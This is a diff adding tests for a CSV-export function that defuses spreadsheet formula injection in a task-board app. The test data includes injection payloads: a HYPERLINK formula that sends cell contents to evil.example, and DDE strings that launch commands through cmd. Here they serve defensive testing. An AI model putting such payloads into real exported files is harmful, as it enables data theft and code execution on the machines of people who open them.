@@ -8,7 +8,7 @@ import { DEFAULT_STATUS_LABELS, cellValue, elapsed, isBlank, readCell, writeCell
 import { makeBoard, makeColumn, itemDraft, normaliseWork, topLevel } from '../src/work/schema.js'
 import { applyFilters, applySort, groupItems, opsFor, summarise } from '../src/work/query.js'
 import { dependencyShifts, describeAutomation, dueEffects, makeAutomation, planEffects, recipeCatalogue } from '../src/work/automations.js'
-import { boardFromTable, boardToCsv } from '../src/work/csv.js'
+import { boardFromTable, boardToCsv, defuse } from '../src/work/csv.js'
 import { TEMPLATES } from '../src/work/templates.js'
 import { parseDelimited, toTable } from '../src/ingest/parsers/csv.js'
 import { makeEntity } from '../src/data/schema.js'
@@ -380,4 +380,52 @@ test('a status column keeps the label the person picked', () => {
 test('the default status labels cover every entity status the app uses', () => {
   const mapped = new Set(DEFAULT_STATUS_LABELS.map((l) => l.maps))
   for (const status of ['open', 'doing', 'done', 'blocked']) assert.ok(mapped.has(status), status)
+})
+
+/*
+ * CSV injection.
+ *
+ * A row title can be the headline of any page somebody saved, or a cell from
+ * a CSV that was imported in the first place. Excel, LibreOffice and Sheets
+ * all run a cell that opens with = + - @ as a formula, and CSV quoting does
+ * not stop them: the quotes are syntax and are gone before the formula is
+ * read.
+ */
+
+test('an exported cell cannot become a formula in a spreadsheet', () => {
+  for (const attack of [
+    '=HYPERLINK("https://evil.example/?x="&A1,"Invoice")',
+    '+cmd|\'/c calc\'!A1',
+    '-2+3+cmd|\'/c calc\'!A1',
+    '@SUM(1+9)*cmd|\'/c calc\'!A1',
+    '\tleading tab',
+  ]) {
+    assert.equal(defuse(attack), `'${attack}`, attack)
+  }
+})
+
+test('numbers are left alone, because they are values and not formulas', () => {
+  // Prefixing these would wreck every numeric column to defend against nothing.
+  for (const number of ['-5', '+3.2', '1e-9', '-0.5', '+12']) {
+    assert.equal(defuse(number), number, number)
+  }
+})
+
+test('ordinary text is untouched', () => {
+  for (const text of ['Rewrite the rollback script', '', 'a - b', "'tis the season", '3 + 4 later']) {
+    assert.equal(defuse(text), text, text)
+  }
+})
+
+test('a defused cell is still quoted correctly when it needs quoting', () => {
+  const board = makeBoard({ name: 'B', itemNoun: 'Task' })
+  board.groups = [{ id: 'g1', name: 'Group' }]
+  const rows = [makeEntity({ title: '=HYPERLINK("https://evil.example","x"),y', meta: { board: board.id, group: 'g1' } })]
+  const csv = boardToCsv(board, rows, [])
+  const line = csv.split('\n')[1]
+
+  // Neutralised, and the comma inside it still cannot break the column count.
+  assert.ok(line.startsWith('"\'=HYPERLINK'), line)
+  assert.equal(line.split('","').length >= 1, true)
+  assert.equal(csv.split('\n').length, 2)
 })
